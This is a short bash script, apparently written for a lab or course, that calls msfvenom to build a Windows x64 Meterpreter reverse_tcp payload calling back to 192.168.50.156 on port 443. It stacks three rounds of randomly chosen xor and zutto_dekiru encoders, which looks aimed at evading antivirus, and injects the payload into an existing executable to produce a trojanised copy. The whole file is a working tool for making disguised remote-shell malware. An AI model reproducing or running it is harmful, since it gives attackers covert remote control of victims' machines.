#!/bin/bash

# venom.sh
# Artur Matias
# 2021-06-24


arch='x64'
platform='windows'
payload='windows/x64/meterpreter/reverse_tcp'
lhost='192.168.50.156'
lport='443'
random=$(date +%s%N | cut -b10-19)
file='wa64'

encoders=("xor" "xor_context" "xor_dynamic" "zutto_dekiru")
r1=$[ $RANDOM % 20 + 1 ]
r2=$[ $RANDOM % 20 + 1 ]
r3=$[ $RANDOM % 20 + 1 ]
renc1=$[ $RANDOM % 4 + 0 ]
renc2=$[ $RANDOM % 4 + 0 ]
renc3=$[ $RANDOM % 4 + 0 ]

banner() {
clear
echo "#------------------------------------------------------------------------------#
|       16242 - Artur Matias                                   2021-08-01      |
#------------------------------------------------------------------------------#"
}

exploit() {
#echo "What file?"
#read -p "> " file
echo "
msfvenom -a $arch --platform $platform -p $payload lhost=$lhost lport=$lport -e $arch/${encoders[renc1]} -i $r1 -f raw | msfvenom -a $arch --platform $platform -e $arch/${encoders[renc2]} -i $r2 -f raw | msfvenom -a $arch --platform $platform -e $arch/${encoders[renc3]} -i $r3 -x ./$file.exe  -f exe-only -o $file-1.exe
" > msf
chmod +x msf
./msf
cat msf
rm msf
}

options() {
echo "
Select an option:
    1 - msfvenom
    0 - Exit
"
read -p "> " option

case $option in
	1) exploit ;;
	0) echo "[*] Goodbye..." ;;
	*) echo "[-] Please select a valid option..."; options ;;
esac
}


#banner
#options
exploit

